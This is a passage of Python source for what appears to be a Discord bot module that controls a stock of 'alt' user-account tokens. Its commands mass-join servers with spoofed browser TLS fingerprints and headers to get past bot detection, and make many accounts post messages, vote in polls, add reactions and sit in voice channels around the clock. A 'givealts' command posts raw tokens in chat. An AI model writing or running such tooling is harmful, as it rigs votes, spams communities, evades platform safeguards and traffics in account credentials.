                self._task.cancel()

        async def _run(self):
            while not self._stop_event.is_set():
                try:
                    async with aiohttp.ClientSession() as session:
                        async with session.ws_connect(self.GATEWAY, heartbeat=None) as ws:
                            self._ws = ws
                            heartbeat_interval = None
                            heartbeat_task = None
                            sequence = None
                            identified = False

                            async for msg in ws:
                                if self._stop_event.is_set():
                                    break
                                if msg.type in (aiohttp.WSMsgType.CLOSED, aiohttp.WSMsgType.ERROR):
                                    break

                                data = msg.json()
                                op = data.get("op")
                                s = data.get("s")
                                if s:
                                    sequence = s
                                d = data.get("d", {})

                                # OP 10 — Hello → start heartbeat + identify
                                if op == 10:
                                    heartbeat_interval = d.get("heartbeat_interval", 41250) / 1000.0
                                    if heartbeat_task:
                                        heartbeat_task.cancel()
                                    heartbeat_task = asyncio.create_task(
                                        self._heartbeat(ws, heartbeat_interval, lambda: sequence)
                                    )
                                    # Identify
                                    await ws.send_json({
                                        "op": 2,
                                        "d": {
                                            "token": self.token,
                                            "properties": {
                                                "$os": "windows",
                                                "$browser": "Discord",
                                                "$device": "desktop"
                                            },
                                            "presence": {
                                                "status": "online",
                                                "since": 0,
                                                "activities": [],
                                                "afk": False
                                            },
                                            "compress": False,
                                            "large_threshold": 50
                                        }
                                    })

                                # OP 0 READY — send voice state update
                                elif op == 0 and data.get("t") == "READY" and not identified:
                                    identified = True
                                    await ws.send_json({
                                        "op": 4,
                                        "d": {
                                            "guild_id": self.guild_id,
                                            "channel_id": self.channel_id,
                                            "self_mute": True,
                                            "self_deaf": True
                                        }
                                    })

                                # OP 11 — heartbeat ack (no-op)
                                elif op == 11:
                                    pass

                                # OP 9 — invalid session → re-identify
                                elif op == 9:
                                    await asyncio.sleep(2)
                                    break

                                # OP 7 — reconnect
                                elif op == 7:
                                    break

                            if heartbeat_task:
                                heartbeat_task.cancel()

                except asyncio.CancelledError:
                    break
                except Exception as e:
                    print(f"[AltVC] Token error: {e}")

                if not self._stop_event.is_set():
                    # Reconnect after a short delay
                    await asyncio.sleep(5)

        @staticmethod
        async def _heartbeat(ws, interval: float, seq_getter):
            while True:
                await asyncio.sleep(interval)
                if ws.closed:
                    break
                try:
                    await ws.send_json({"op": 1, "d": seq_getter()})
                except Exception:
                    break

    def _load_tokens(self, amount: str) -> list[str] | None:
        try:
            with open("alt_tokens_data/alt_tokens.txt", "r") as f:
                raw = [t.strip() for t in f.read().splitlines() if t.strip()]
            tokens = [t.split(":")[2] if "@" in t else t for t in raw]
            if amount.lower() == "all":
                return tokens
            n = int(amount)
            return tokens[:n]
        except FileNotFoundError:
            return None
        except ValueError:
            return None

    @commands.command(name="altjoinvc")
    async def altjoinvc(self, ctx, channel_id: str, amount: str, delay: float = 1.5):
        """Join a voice channel with alt accounts and stay 24/7."""
        await ctx.message.delete()

        # Resolve guild from channel
        try:
            channel_id_int = int(channel_id)
            vc_channel = self.bot.get_channel(channel_id_int)
            if not vc_channel:
                vc_channel = await self.bot.fetch_channel(channel_id_int)
            guild_id = str(vc_channel.guild.id) if vc_channel and vc_channel.guild else None
        except Exception:
            guild_id = None

        if not guild_id:
            await senderror(ctx, "Alt Join VC", f"Could not resolve guild for channel `{channel_id}`. Make sure the bot is in that server.")
            return

        tokens = self._load_tokens(amount)
        if tokens is None:
            await senderror(ctx, "Alt Join VC", "Could not load tokens. Check `alt_tokens_data/alt_tokens.txt`.")
            return
        if not tokens:
            await senderror(ctx, "Alt Join VC", "No tokens found.")
            return

        count = len(tokens)
        status_msg = await ctx.send(f"> # Alt Join VC\n\nStarting `{count}` alts joining <#{channel_id_int}>...")

        # Stop any existing sessions for this channel
        if channel_id in self._vc_sessions:
            for sess in self._vc_sessions[channel_id]:
                await sess.stop()
            self._vc_sessions[channel_id] = []

        sessions = []
        success = 0
        failed = 0

        for i, token in enumerate(tokens):
            try:
                sess = alts.AltVCSession(token, guild_id, channel_id)
                await sess.start()
                sessions.append(sess)
                success += 1
            except Exception as e:
                print(f"[AltVC] Failed to start session for token {i+1}: {e}")
                failed += 1

            if i < count - 1:
                await asyncio.sleep(delay)

            if (i + 1) % 5 == 0 or i == count - 1:
                progress = f"**Progress:** {i+1}/{count} | Connected: {success} | Failed: {failed}"
                try:
                    await status_msg.edit(content=f"> # Alt Join VC\n\n{progress}")
                except Exception:
                    pass

        self._vc_sessions[channel_id] = sessions

        await status_msg.delete()
        summary = (
            f"**Voice Channel:** <#{channel_id_int}>\n"
            f"**Guild ID:** `{guild_id}`\n"
            f"**Total Alts:** `{count}`\n"
            f"**Connected:** `{success}`\n"
            f"**Failed:** `{failed}`\n"
            f"**Delay:** `{delay}s`\n\n"
            f"Alts will stay connected 24/7 with auto-reconnect.\n"
            f"Use `+altleavevc {channel_id}` to disconnect all."
        )
        await send(ctx, "Alt Join VC — Connected", summary)

    @commands.command(name="altleavevc")
    async def altleavevc(self, ctx, channel_id: str, amount: str = "all", delay: float = 0.5):
        """Disconnect alt accounts from a voice channel."""
        await ctx.message.delete()

        sessions = self._vc_sessions.get(channel_id, [])

        if not sessions:
            await senderror(ctx, "Alt Leave VC", f"No active alt sessions found for channel `{channel_id}`.")
            return

        if amount.lower() == "all":
            target_sessions = sessions
        else:
            try:
                n = int(amount)
                target_sessions = sessions[:n]
            except ValueError:
                await senderror(ctx, "Alt Leave VC", "Invalid amount. Use a number or 'all'.")
                return

        count = len(target_sessions)
        status_msg = await ctx.send(f"> # Alt Leave VC\n\nDisconnecting `{count}` alts from <#{channel_id}>...")

        disconnected = 0
        for i, sess in enumerate(target_sessions):
            try:
                await sess.stop()
                disconnected += 1
            except Exception as e:
                print(f"[AltVC] Stop error: {e}")

            if delay > 0 and i < count - 1:
                await asyncio.sleep(delay)

        # Remove stopped sessions
        remaining = [s for s in sessions if s not in target_sessions]
        if remaining:
            self._vc_sessions[channel_id] = remaining
        else:
            self._vc_sessions.pop(channel_id, None)

        await status_msg.delete()
        summary = (
            f"**Voice Channel:** <#{channel_id}>\n"
            f"**Disconnected:** `{disconnected}`\n"
            f"**Remaining Active:** `{len(remaining)}`"
        )
        await send(ctx, "Alt Leave VC — Disconnected", summary)

    def get_cookies(self) -> dict:
        try:
            response = requests.get("https://discord.com").cookies
            cookies = {
                "__dcfduid": response.get("__dcfduid"),
                "__sdcfduid": response.get("__sdcfduid"),
                "_cfuvid": response.get("_cfuvid"),
                "__cfruid": response.get("__cfruid"),
            }
            return cookies
        except Exception as e:
            return {}

    def ran_str(self, length=16):
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

    async def join_with_token(self, token, invite, ctx):
        try:
            chrome = "126"
            fingerprint_dict = random.choice(fps)
            ja3 = fingerprint_dict["ja3"]
            user_agent = fingerprint_dict["user-agent"]
            x_super_properties = fingerprint_dict["x-super-properties"]

            session = tls_client.Session(
                client_identifier="chrome_" + chrome,
                random_tls_extension_order=True,
                ja3_string=ja3,
            )
            headers = {
                "accept": "*/*",
                "accept-language": "en-US,en;q=0.9",
                "authorization": token,
                "content-type": "application/json",
                "origin": "https://discord.com",
                "priority": "u=1, i",
                "referer": "https://discord.com",
                "sec-ch-ua": f'"Not)A;Brand";v="99", "Microsoft Edge";v="{chrome}", "Chromium";v="{chrome}"',
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": '"Windows"',
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "user-agent": user_agent,
                "x-debug-options": "bugReporterEnabled",
                "x-discord-locale": "en-US",
                "x-discord-timezone": "Asia/Katmandu",
                "x-super-properties": x_super_properties,
            }
            join_data = {"session_id": self.ran_str()}
            response = session.post(
                f"https://discord.com/api/v9/invites/{invite}",
                headers=headers,
                json=join_data,
                cookies=self.get_cookies(),
            )
            try:
                data = response.json()
            except:
                data = {}
            if response.status_code == 200:
                return True
            elif "captcha_sitekey" in data or response.status_code in [400, 403] or "captcha" in response.text.lower():
                return "captcha"
            else:
                return False
        except Exception:
            return False

    async def update_result_message(self, ctx, result_message, msg, page_count):
        if len(result_message.content) + len(msg) + 1 > 2000:  
            new_page_message = await ctx.send(f"Joiner result page {page_count + 1}")
            result_message = new_page_message
            page_count += 1 
        updated_content = result_message.content + f"\n> {msg}" if result_message.content else f"> {msg}"
        await result_message.edit(content=updated_content)
        return result_message, page_count

    async def check_token(self, token):
        try:
            token = token.split(":")[2] if "@" in token else token            
            headers = {'Authorization': token, 'Content-Type': 'application/json'}
            data = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)

            if data.status_code == 200:
                return True
            else:
                return False
        except Exception as e:
            return False 

    @commands.command(aliases=['alt'])
    async def alts(self, ctx):
        try:
            with open("alt_tokens_data/alt_tokens.txt", "r") as file:
                tokens = file.read().splitlines()
                loaded_tokens_count = len(tokens)
        except FileNotFoundError:
            loaded_tokens_count = 0
        with open('config.json', 'r') as config_file:
            config = json.load(config_file)
        prefix = config.get("prefix")
        await ctx.message.delete()            
        content = (
            f"<:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095>\n"
            f"<:BadgeDeveloper:1290693804013129768> **LOADED `{loaded_tokens_count}` TOKENS** <a:Bot:1336670517486161951>\n"
            f"<:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095>\n"    
            f"<:BadgeDeveloper:1290693804013129768> **`[REQUIRED] | <OPTIONAL>`** <a:Bot:1336670517486161951>\n"
            f"<:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095>\n"                      
            f"<:discord:1282007043456241717> | **Send Msg** **:** **`{prefix}say [chan_id] [amt/all] <delay> [msg]`**\n"
            f"<:discord:1282007043456241717> | **Oauth Joiner** **:** **`{prefix}ajoin [g_id] [count] <nickname>`**\n"
            f"<:discord:1282007043456241717> | **Bot invite link** **:** **`{prefix}invite`**\n"
            f"<:discord:1282007043456241717> | **Join Srv/gc** **:** **`{prefix}join [link] [Count]`**\n"
            f"<:discord:1282007043456241717> | **Check ALTs** **:** **`{prefix}checkalts`**\n"
            f"<:discord:1282007043456241717> | **Give tokens** **:** **`{prefix}givealts [count]`**\n"
            f"<:discord:1282007043456241717> | **Add Token** **:** **`{prefix}addalts [tokens]`**\n"
            f"<:discord:1282007043456241717> | **Remove Token** **:** **`{prefix}remalt [token]`**\n"
            f"<:discord:1282007043456241717> | **Clear Tokens** **:** **`{prefix}clearalts`**\n"
            f"<:discord:1282007043456241717> | **Leave Server** **:** **`{prefix}leave [guild_id] [amt/all] <delay>`**\n"
            f"<:discord:1282007043456241717> | **Set Presence** **:** **`{prefix}setaltstatus [status]`**\n"
            f"<:discord:1282007043456241717> | **Add Reaction** **:** **`{prefix}altreact [chan_id] [msg_id] [amt/all] <delay>`**\n"
            f"<:discord:1282007043456241717> | **Poll Voting** **:** **`{prefix}vote [chan_id] [msg_id] [amt/all] <delay>`**\n"
            f"<:discord:1282007043456241717> | **Join Voice Channel** **:** **`{prefix}altjoinvc [chan_id] [amt/all] <delay>`**\n"
            f"<:discord:1282007043456241717> | **Leave Voice Channel** **:** **`{prefix}altleavevc [chan_id] [amt/all] <delay>`**\n"
            f"<:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095><:emoji_1739864737772:1341314670346371095>"        
        )
        await send(ctx, "<:devs:1290693770567749652>__Alt Token Cmds__<:Titanz:1281243489635405827>",content)


    @commands.command()
    async def givealts(self, ctx, count: int):
        await ctx.message.delete()
        file_path = "alt_tokens_data/alt_tokens.txt"

        try:
            async with aiofiles.open(file_path, mode="r") as f:
                tokens = await f.readlines()

            tokens = [t.strip() for t in tokens if t.strip()]
            if len(tokens) < count:
                return await ctx.send(f":x: **Not enough tokens available.** Only `{len(tokens)}` left.", delete_after=5)

            confirmation_msg = await ctx.send(f"**Are you sure you want to send `{count}` alt tokens here?**\n-# Reply with `yes` within **30 seconds** to confirm.")

            def check(m):
                return m.author == ctx.author and m.channel == ctx.channel and m.content.lower() == "yes"

            try:
                reply = await self.bot.wait_for("message", check=check, timeout=30)
                await confirmation_msg.delete()
                await reply.delete()
            except asyncio.TimeoutError:
                await confirmation_msg.delete()
                return await ctx.send(":x: **Token send operation timed out.**", delete_after=5)

            tokens_to_send = tokens[:count]
            remaining_tokens = tokens[count:]

            async with aiofiles.open(file_path, mode="w") as f:
                await f.write("\n".join(remaining_tokens) + "\n")

            token_text = "\n".join(tokens_to_send)

            if len(token_text) <= 1900:
                await ctx.send(token_text)
            else:
                temp_path = f"alt_tokens_data/tokens.txt"
                async with aiofiles.open(temp_path, "w") as f:
                    await f.write(token_text)

                await ctx.send(
                    content=":warning: **Writing limit reached, sending as a `.txt` file instead.**",
                    file=discord.File(temp_path)
                )
                try:
                    os.remove(temp_path)
                except Exception as e:
                    print(f"Failed to delete temp file: {e}")

        except FileNotFoundError:
            await ctx.send(f":x: **The file for tokens does not exist.**", delete_after=5)

    @commands.command(name="say")
    async def say(self, ctx, channel_id: str, amount: str, delay: float = 1.0, *, text: str):
        await ctx.message.delete()
        if amount.lower() == "all":
            try:
                with open("alt_tokens_data/alt_tokens.txt", "r") as f:
                    tokens = f.read().splitlines()
                count = len(tokens)
            except FileNotFoundError:
                await send(ctx, "Say Results", "❌ No tokens found in `alt_tokens_data/alt_tokens.txt`")
                return
        else:
            try:
                count = int(amount)
            except ValueError:
                await send(ctx, "Say Results", "❌ Invalid amount. Use a number or 'all'")
                return

        try:
            with open("alt_tokens_data/alt_tokens.txt", "r") as f:
                tokens = f.read().splitlines()

            if not tokens:
                await send(ctx, "Say Results", "❌ No tokens found")
                return

            if count > len(tokens):
                count = len(tokens)

            status_msg = await send(ctx, "Say Progress", f"🚀 Sending message to channel `{channel_id}` with {count} accounts...")
            
            selected_tokens = tokens[:count]
            success = 0
            failed = 0

            headers_template = {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            }

            url = f"https://discord.com/api/v9/channels/{channel_id}/messages"
            payload = {"content": text}

            async with aiohttp.ClientSession() as session:
                for i, token in enumerate(selected_tokens):
                    token = token.split(":")[2] if "@" in token else token
                    token = token.strip()
                    
                    headers = headers_template.copy()
                    headers["Authorization"] = token
                    
                    try:
                        async with session.post(url, headers=headers, json=payload) as resp:
                            if resp.status == 200:
                                success += 1
                            else:
                                failed += 1
                    except Exception:
                        failed += 1

                    if i < len(selected_tokens) - 1:
                        await asyncio.sleep(delay)

                    if (i + 1) % 5 == 0 or i == len(selected_tokens) - 1:
                        progress = f"**Progress:** {i+1}/{count} | ✅ Success: {success} | ❌ Failed: {failed}"
                        await status_msg.edit(content=f">>> # Say Progress\n\n{progress}")

            summary = (
                f"**Channel:** `{channel_id}`\n"
                f"**Total accounts:** `{count}`\n"
                f"**✅ Success:** `{success}`\n"
                f"**❌ Failed:** `{failed}`\n"
                f"**⏱️ Delay:** `{delay}s`"
            )
            await status_msg.delete()
            await send(ctx, "Say Completed", summary)

        except FileNotFoundError:
            await send(ctx, "Say Results", "❌ `alt_tokens_data/alt_tokens.txt` not found")
        except Exception as e:
            await send(ctx, "Say Results", f"❌ Error: {str(e)}")

    @commands.command(name="leave")
    async def leave(self, ctx, guild_id: str, amount: str, delay: float = 1.0):
        await ctx.message.delete()
        if amount.lower() == "all":
            try:
                with open("alt_tokens_data/alt_tokens.txt", "r") as f:
                    tokens = f.read().splitlines()
                count = len(tokens)
            except FileNotFoundError:
                await send(ctx, "Leave Results", "❌ No tokens found in `alt_tokens_data/alt_tokens.txt`")
                return
        else:
            try:
                count = int(amount)
            except ValueError:
                await send(ctx, "Leave Results", "❌ Invalid amount. Use a number or 'all'")
                return

        try:
            with open("alt_tokens_data/alt_tokens.txt", "r") as f:
                tokens = f.read().splitlines()

            if not tokens:
                await send(ctx, "Leave Results", "❌ No tokens found")
                return

            if count > len(tokens):
                count = len(tokens)

            status_msg = await send(ctx, "Leave Progress", f"🚀 Leaving guild `{guild_id}` with {count} accounts...")
            
            selected_tokens = tokens[:count]
            success = 0
            failed = 0

            url = f"https://discord.com/api/v9/users/@me/guilds/{guild_id}"
            headers_template = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            }

            async with aiohttp.ClientSession() as session:
                for i, token in enumerate(selected_tokens):
                    token = token.split(":")[2] if "@" in token else token
                    token = token.strip()
                    
                    headers = headers_template.copy()
                    headers["Authorization"] = token
                    
                    try:
                        async with session.delete(url, headers=headers) as resp:
                            if resp.status == 204:
                                success += 1
                            else:
                                failed += 1
                    except Exception:
                        failed += 1

                    if i < len(selected_tokens) - 1:
                        await asyncio.sleep(delay)

                    if (i + 1) % 5 == 0 or i == len(selected_tokens) - 1:
                        progress = f"**Progress:** {i+1}/{count} | ✅ Success: {success} | ❌ Failed: {failed}"
                        await status_msg.edit(content=f">>> # Leave Progress\n\n{progress}")

            summary = (
                f"**Guild:** `{guild_id}`\n"
                f"**Total accounts:** `{count}`\n"
                f"**✅ Success:** `{success}`\n"
                f"**❌ Failed:** `{failed}`\n"
                f"**⏱️ Delay:** `{delay}s`"
            )
            await status_msg.delete()
            await send(ctx, "Leave Completed", summary)

        except FileNotFoundError:
            await send(ctx, "Leave Results", "❌ `alt_tokens_data/alt_tokens.txt` not found")
        except Exception as e:
            await send(ctx, "Leave Results", f"❌ Error: {str(e)}")

    @commands.command(name="setaltstatus")
    async def setaltstatus(self, ctx, status: str):
        await ctx.message.delete()
        valid_statuses = ["online", "idle", "dnd", "offline"]
        status = status.lower()
        if status not in valid_statuses:
            await send(ctx, "Set Status", f"❌ Invalid status. Choose from: `{', '.join(valid_statuses)}`")
            return

        try:
            with open("alt_tokens_data/alt_tokens.txt", "r") as f:
                tokens = f.read().splitlines()

            if not tokens:
                await send(ctx, "Set Status", "❌ No tokens found")
                return

            status_msg = await send(ctx, "Set Status", f"🔄 Setting status to `{status}` for {len(tokens)} accounts...")

            headers_template = {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            }
            payload = {
                "status": status,
                "since": 0,
                "activities": [],
                "afk": False
            }

            async with aiohttp.ClientSession() as session:
                for token in tokens:
                    token = token.split(":")[2] if "@" in token else token
                    token = token.strip()
                    
                    headers = headers_template.copy()
                    headers["Authorization"] = token
                    
                    try:
                        await session.patch("https://discord.com/api/v9/users/@me/settings", headers=headers, json=payload)
                    except:
                        pass
                    await asyncio.sleep(0.1)

            await status_msg.delete()
            await send(ctx, "Set Status Completed", f"✅ Status set to `{status}` for all `{len(tokens)}` accounts.")

        except FileNotFoundError:
            await send(ctx, "Set Status", "❌ `alt_tokens_data/alt_tokens.txt` not found")
        except Exception as e:
            await send(ctx, "Set Status", f"❌ Error: {str(e)}")

    @commands.command(name="altreact")
    async def altreact(self, ctx, channel_id: str, message_id: str, amount: str, delay: float = 1.0):
        await ctx.message.delete()
        if amount.lower() == "all":
            try:
                with open("alt_tokens_data/alt_tokens.txt", "r") as f:
                    tokens = f.read().splitlines()
                count = len(tokens)
            except FileNotFoundError:
                await send(ctx, "React Results", "❌ No tokens found in `alt_tokens_data/alt_tokens.txt`")
                return
        else:
            try:
                count = int(amount)
            except ValueError:
                await send(ctx, "React Results", "❌ Invalid amount. Use a number or 'all'")
                return

        try:
            with open("alt_tokens_data/alt_tokens.txt", "r") as f:
                tokens = f.read().splitlines()

            if not tokens:
                await send(ctx, "React Results", "❌ No tokens found")
                return

            if count > len(tokens):
                count = len(tokens)

            # Fetch the message to get existing reactions
            try:
                channel = self.bot.get_channel(int(channel_id)) or await self.bot.fetch_channel(int(channel_id))
                message = await channel.fetch_message(int(message_id))
            except Exception as e:
                await send(ctx, "React Results", f"❌ Failed to fetch message: {e}")
                return

            reactions = message.reactions
            selected_emoji = None

            def check_msg(m):
                return m.author == ctx.author and m.channel == ctx.channel

            if len(reactions) == 0:
                prompt_msg = await send(ctx, "Custom Emoji", "No existing reactions found on this message. Please reply with the custom emoji you want to use:")
                try:
                    user_response = await self.bot.wait_for('message', check=check_msg, timeout=30.0)
                    selected_emoji = user_response.content.strip()
                    try:
                        await user_response.delete()
                    except:
                        pass
                    await prompt_msg.delete()
                except asyncio.TimeoutError:
                    await prompt_msg.delete()
                    await send(ctx, "React Results", "❌ Selection timed out (30s).")
                    return
            else:
                choices_text = ""
                choices_map = {}
                idx = 1
                for r in reactions:
                    emoji_str = str(r.emoji)
                    choices_text += f"**{idx}.** {emoji_str}\n"
                    choices_map[idx] = emoji_str
                    idx += 1
                    
                custom_idx = idx
                choices_text += f"**{custom_idx}.** Custom Emoji (Type custom emoji directly)"
                
                menu_msg = await send(ctx, "Select Reaction", f"Select a reaction from the list below by replying with the number (e.g. `1`):\n\n{choices_text}")
                
                try:
                    user_response = await self.bot.wait_for('message', check=check_msg, timeout=30.0)
                    choice = user_response.content.strip()
                    try:
                        await user_response.delete()
                    except:
                        pass
                except asyncio.TimeoutError:
                    await menu_msg.delete()
                    await send(ctx, "React Results", "❌ Reaction selection timed out (30s).")
                    return
                    
                if choice.isdigit():
                    choice_num = int(choice)
                    if choice_num == custom_idx:
                        custom_prompt = await send(ctx, "Custom Emoji", "Please respond with the custom emoji you want to use:")
                        try:
                            user_emoji_msg = await self.bot.wait_for('message', check=check_msg, timeout=30.0)
                            selected_emoji = user_emoji_msg.content.strip()
                            try:
                                await user_emoji_msg.delete()
                            except:
                                pass
                            await custom_prompt.delete()
                        except asyncio.TimeoutError:
                            await custom_prompt.delete()
                            await menu_msg.delete()
                            await send(ctx, "React Results", "❌ Selection timed out (30s).")
                            return
                    elif choice_num in choices_map:
                        selected_emoji = choices_map[choice_num]
                    else:
                        await menu_msg.delete()
                        await send(ctx, "React Results", "❌ Invalid choice number.")
                        return
                else:
                    await menu_msg.delete()
                    await send(ctx, "React Results", "❌ Choice must be a number.")
                    return

                await menu_msg.delete()

            if not selected_emoji:
                await send(ctx, "React Results", "❌ No emoji selected.")
                return

            status_msg = await send(ctx, "React Progress", f"🚀 Adding reaction `{selected_emoji}` to message `{message_id}` with {count} accounts...")
            
            selected_tokens = tokens[:count]
            success = 0
            failed = 0

            import urllib.parse
            encoded_emoji = urllib.parse.quote(selected_emoji, safe='')
            
            url = f"https://discord.com/api/v9/channels/{channel_id}/messages/{message_id}/reactions/{encoded_emoji}/@me"
            headers_template = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            }

            async with aiohttp.ClientSession() as session:
                for i, token in enumerate(selected_tokens):
                    token = token.split(":")[2] if "@" in token else token
                    token = token.strip()
                    
                    headers = headers_template.copy()
                    headers["Authorization"] = token
                    
                    try:
                        async with session.put(url, headers=headers) as resp:
                            if resp.status in (200, 204):
                                success += 1
                            else:
                                failed += 1
                    except Exception:
                        failed += 1

                    if i < len(selected_tokens) - 1:
                        await asyncio.sleep(delay)

                    if (i + 1) % 5 == 0 or i == len(selected_tokens) - 1:
                        progress = f"**Progress:** {i+1}/{count} | ✅ Success: {success} | ❌ Failed: {failed}"
                        await status_msg.edit(content=f">>> # React Progress\n\n{progress}")

            summary = (
                f"**Message ID:** `{message_id}`\n"
                f"**Emoji:** `{selected_emoji}`\n"
                f"**Total accounts:** `{count}`\n"
                f"**✅ Success:** `{success}`\n"
                f"**❌ Failed:** `{failed}`\n"
                f"**⏱️ Delay:** `{delay}s`"
            )
            await status_msg.delete()
            await send(ctx, "React Completed", summary)

        except FileNotFoundError:
            await send(ctx, "React Results", "❌ `alt_tokens_data/alt_tokens.txt` not found")
        except Exception as e:
            await send(ctx, "React Results", f"❌ Error: {str(e)}")

    @commands.command(name="vote")
    async def vote(self, ctx, channel_id: str, message_id: str, amount: str, delay: float = 1.0):
        await ctx.message.delete()
        if amount.lower() == "all":
            try:
                with open("alt_tokens_data/alt_tokens.txt", "r") as f:
                    tokens = f.read().splitlines()
                count = len(tokens)
            except FileNotFoundError:
                await send(ctx, "Vote Results", "❌ No tokens found in `alt_tokens_data/alt_tokens.txt`")
                return
        else:
            try:
                count = int(amount)
            except ValueError:
                await send(ctx, "Vote Results", "❌ Invalid amount. Use a number or 'all'")
                return

        try:
            with open("alt_tokens_data/alt_tokens.txt", "r") as f:
                tokens = f.read().splitlines()

            if not tokens:
                await send(ctx, "Vote Results", "❌ No tokens found")
                return

            if count > len(tokens):
                count = len(tokens)

            # Fetch poll details using the bot's auth token
            msg_data = None
            headers = {
                "Authorization": self.bot.http.token,
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            }
            url = f"https://discord.com/api/v9/channels/{channel_id}/messages?around={message_id}&limit=1"
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get(url, headers=headers) as resp:
                        if resp.status == 200:
                            msgs = await resp.json()
                            if isinstance(msgs, list) and len(msgs) > 0:
                                for m in msgs:
                                    if str(m.get("id")) == str(message_id):
                                        msg_data = m
                                        break
            except Exception as e:
                await send(ctx, "Vote Results", f"❌ Failed to fetch message poll data: {e}")
                return

            if not msg_data:
                await send(ctx, "Vote Results", "❌ Message not found or could not be fetched.")
                return

            poll_data = msg_data.get("poll")
            if not poll_data:
                await send(ctx, "Vote Results", "❌ This message does not contain a poll!")
                return

            question_text = poll_data.get("question", {}).get("text", "Poll")
            answers = poll_data.get("answers", [])
            
            choices_text = ""
            choices_map = {}
            
            for idx, ans in enumerate(answers):
                answer_id = ans.get("answer_id")
                answer_text = ans.get("poll_media", {}).get("text", "")
                choices_text += f"**{idx + 1}.** {answer_text} (ID: {answer_id})\n"
                choices_map[idx + 1] = answer_id

            def check_msg(m):
                return m.author == ctx.author and m.channel == ctx.channel

            menu_msg = await send(ctx, f"Poll: {question_text}", f"Select an option by replying with the number (e.g. `1`):\n\n{choices_text}")

            try:
                user_response = await self.bot.wait_for('message', check=check_msg, timeout=30.0)
                choice = user_response.content.strip()
                try:
                    await user_response.delete()
                except:
                    pass
            except asyncio.TimeoutError:
                await menu_msg.delete()
                await send(ctx, "Vote Results", "❌ Vote selection timed out (30s).")
                return

            if choice.isdigit():
                choice_num = int(choice)
                if choice_num in choices_map:
                    selected_answer_id = choices_map[choice_num]
                else:
                    await menu_msg.delete()
                    await send(ctx, "Vote Results", "❌ Invalid choice number.")
                    return
            else:
                await menu_msg.delete()
                await send(ctx, "Vote Results", "❌ Choice must be a number.")
                return

            await menu_msg.delete()

            status_msg = await send(ctx, "Vote Progress", f"🚀 Casting vote on answer `{selected_answer_id}` for message `{message_id}` with {count} accounts...")
            
            selected_tokens = tokens[:count]
            success = 0
            failed = 0

            url = f"https://discord.com/api/v9/channels/{channel_id}/polls/{message_id}/answers/@me"
            payload = {"answer_ids": [str(selected_answer_id)]}
            headers_template = {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            }

            async with aiohttp.ClientSession() as session:
                for i, token in enumerate(selected_tokens):
                    token = token.split(":")[2] if "@" in token else token
                    token = token.strip()
                    
                    headers = headers_template.copy()
                    headers["Authorization"] = token
                    
                    try:
                        async with session.put(url, headers=headers, json=payload) as resp:
                            if resp.status in (200, 204):
                                success += 1
                            else:
                                failed += 1
                    except Exception:
                        failed += 1

                    if i < len(selected_tokens) - 1:
                        await asyncio.sleep(delay)

                    if (i + 1) % 5 == 0 or i == len(selected_tokens) - 1:
                        progress = f"**Progress:** {i+1}/{count} | ✅ Success: {success} | ❌ Failed: {failed}"
                        await status_msg.edit(content=f">>> # Vote Progress\n\n{progress}")

            summary = (
                f"**Message ID:** `{message_id}`\n"
                f"**Answer ID:** `{selected_answer_id}`\n"
                f"**Total accounts:** `{count}`\n"
                f"**✅ Success:** `{success}`\n"
                f"**❌ Failed:** `{failed}`\n"
                f"**⏱️ Delay:** `{delay}s`"
            )
            await status_msg.delete()
            await send(ctx, "Vote Completed", summary)

        except FileNotFoundError:
            await send(ctx, "Vote Results", "❌ `alt_tokens_data/alt_tokens.txt` not found")
        except Exception as e:
            await send(ctx, "Vote Results", f"❌ Error: {str(e)}")

    def exchange_code(self, code):
        try:
            data = {
                'client_id': CLIENT_ID,
                'client_secret': CLIENT_SECRET,
                'grant_type': 'authorization_code',
                'code': code,
                'redirect_uri': REDIRECT_URI
            }
            headers = {'Content-Type': 'application/x-www-form-urlencoded'}
